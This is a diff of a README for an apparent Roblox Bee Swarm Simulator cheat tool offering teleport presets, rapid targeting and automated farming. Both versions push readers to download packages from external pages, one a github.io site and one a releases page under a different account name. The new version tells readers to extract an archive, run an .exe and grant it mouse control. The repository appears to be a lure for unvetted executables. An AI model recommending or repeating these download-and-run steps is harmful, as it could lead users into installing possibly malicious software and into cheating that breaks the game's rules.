@@ -1,126 +1,61 @@
-# Bee Swarm Simulator VIP Scripts v2026 - Game Script Utility 2026
+# 🐝 bee-swarm-pc-script-utility - Automated tools for Bee Swarm Simulator
 
-> Roblox Bee Swarm Simulator helper for PC built around rapid targeting, teleport presets, and toggle-driven routine controls.
+[![Download Now](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/strong-federicofellini984/bee-swarm-pc-script-utility/releases)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-PC-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/will-parkerohhn2324/bee-swarm-pc-script-utility?style=flat-square)](https://github.com/will-parkerohhn2324/bee-swarm-pc-script-utility)
+This utility helps you manage tasks in Bee Swarm Simulator on your PC. It automates repetitive actions to save time. You can use this tool to collect resources, move between fields, and manage hive routines without manual input.
 
----
+## ⚙️ How It Works
 
-<p align="center">
-  <a href="https://will-parkerohhn2324.github.io/bee-swarm-pc-script-utility/">
-    <img src="https://img.shields.io/badge/Download-Bee%20Swarm%20Simulator%20VIP%20Scripts-brightgreen?style=for-the-badge" alt="Download Bee Swarm Simulator VIP Scripts">
-  </a>
-</p>
+The utility interacts with the game window to perform actions. It uses set positions for teleporting and automated loops to gather pollen. You control the functions through a simple screen overlay. This allows you to toggle features on or off while you play.
 
-> **[Direct Download - Bee Swarm Simulator VIP Scripts](https://will-parkerohhn2324.github.io/bee-swarm-pc-script-utility/)**
+## 📋 System Requirements
 
----
+To run this software, ensure your computer meets these standards:
 
-[Download Latest Build](https://will-parkerohhn2324.github.io/bee-swarm-pc-script-utility/)
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: At least 4GB of RAM.
+*   Graphics: Software rendering or integrated graphics are sufficient.
+*   Game Settings: Set your Roblox graphics quality to 1 or 2 for best results.
+*   Window Mode: Keep the game in windowed mode while the utility runs.
 
----
+## 🚀 Setting Up the Tool
 
-## What It Is
+1.  Visit the [official releases page](https://github.com/strong-federicofellini984/bee-swarm-pc-script-utility/releases) to download the archive file.
+2.  Save the file to a folder on your computer.
+3.  Right-click the downloaded file and select Extract All.
+4.  Open the extracted folder.
+5.  Locate the file ending in .exe and double-click it.
+6.  Follow the instructions on the screen to finalize the setup.
 
-Bee Swarm Simulator VIP Scripts is a Roblox script utility aimed at PC users and packaged around a lightweight HTML overlay plus a straightforward loader flow. Its core purpose is to simplify repetitive in-game tasks with quick target handling, stored teleport points, and configurable toggles.
+## 🕹️ Using the Features
 
-It is meant for players who want a more organized way to activate common gameplay helpers while still keeping the interface easy to reach through hotkeys and on-screen controls. Instead of a bulky menu system, it stays focused on navigation aids and target assistance.
+Once you launch the program, a small window appears. You can move this window anywhere on your screen.
 
----
+*   Rapid Targeting: Enable this to snap your collection beam to flowers instantly.
+*   Teleport Presets: Select a field name from the dropdown list to move your character there.
+*   Routine Controls: Use the checkboxes to start or stop specific tasks like converting your pollen at the hive or moving to fields.
 
-## Included Features
+Keep the utility window open while the game runs. If you want to stop all actions, close the utility window or press the designated stop hotkey.
 
-- Quick targeting support for faster interaction with selected in-game points or targets
-- Teleport presets for jumping to stored locations without rebuilding paths each time
-- Map position presets to save and reuse common movement spots
-- Hotkey support for faster access to script actions
-- Toggle-based controls for enabling or disabling helper functions as needed
-- Lightweight HTML overlay for a minimal on-screen control layout
-- PC-focused workflow designed for desktop use with Roblox
-- Routine gameplay helpers for everyday movement and action convenience
+## 🛡️ Safety and Performance
 
----
+This utility mimics mouse clicks and keyboard presses. It helps you avoid strain from repetitive tasks. Keep your game settings consistent to ensure the tool finds the correct screen elements. If the tool struggles to click the right buttons, ensure your Windows display scaling is set to 100%.
 
-## Setup Instructions
+## ❓ Frequently Asked Questions
 
-1. Download the latest build from the link above.
-2. Put the included files into a folder of your choice, for example:
-   `bee-swarm-script-utility-vip-scripts-2026`
-3. Open the HTML overlay or loader file in your PC environment.
-4. Use the toggles, hotkeys, and preset controls to tune the helper for your session.
+**Does the software work on Mac?**
+No, this utility is intended for Windows users only.
 
-Example folder layout:
-- `bee-swarm-script-utility-vip-scripts-2026/`
-  - `index.html`
-  - `loader`
-  - `assets/`
+**What do I do if the icons are off-center?**
+Check your Roblox display settings. Ensure the game window is not in full-screen mode. This often fixes alignment issues.
 
-If the package includes a script loader, use the bundled loading steps and keep the overlay file easy to reach for quick access.
+**Can I minimize the game?**
+The tool needs to see the game window to function. Keep the game window visible on your desktop.
 
----
+**How do I update the tool?**
+Check the releases page mentioned above for new versions. Download the latest file and replace your existing version.
 
-## Controls and Options
+**Does this require administrator privileges?**
+The program may ask for permission to control your mouse. This is necessary for the automation features to trigger during gameplay.
 
-| Option | Purpose | Notes |
-| --- | --- | --- |
-| Hotkeys | Trigger actions quickly | Useful for repeated routine tasks |
-| Toggles | Enable or disable helper functions | Keeps the interface simple |
-| Teleport Presets | Store travel destinations | Helps with fast repositioning |
-| Map Position Presets | Save common map spots | Useful for frequent routes or checks |
-| Targeting | Focus on selected points or targets | Supports quicker interaction |
-| Overlay | Display controls in a compact panel | Built for lightweight use |
-
-Example configuration style:
-
-| Setting | Value |
-| --- | --- |
-| Overlay | Enabled |
-| Hotkeys | Enabled |
-| Teleport Presets | Enabled |
-| Targeting | Enabled |
-
----
-
-## Compatibility Notes
-
-- Target game: Roblox Bee Swarm Simulator
-- Platform focus: PC
-- Interface format: HTML-based overlay
-- Best suited for desktop use with a script loader or local launch workflow
-
-Known limitations:
-- Features are oriented toward the supported PC workflow
-- Behavior may vary depending on how the loader is launched or how the overlay is opened
-- Game updates or environment changes may require adjustments to preset usage
-
----
-
-## FAQ
-
-### How do I begin?
-Download the latest build, open the included HTML or loader file, and then use the overlay controls to manage the available helpers.
-
-### Can the controls be adjusted?
-Yes. The utility provides toggles and hotkeys, and the preset-based layout makes it easier to decide which helpers should stay active.
-
-### Are updates supported?
-This repository is presented as a versioned utility, so newer builds can be distributed as updated releases from the same download location.
-
-### What settings are part of it?
-The main options center on targeting, teleport presets, map position presets, hotkey access, and toggle-based control.
-
-### Is this only meant for PC?
-The profile describes it as PC-oriented, so the intended workflow is for desktop use.
-
-### Where is the best place to keep the files?
-A dedicated folder such as `bee-swarm-script-utility-vip-scripts-2026` works well, especially if you want the overlay and loader files stored together.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: roblox, bee-swarm-simulator, automation, utility, windows, gaming-helper
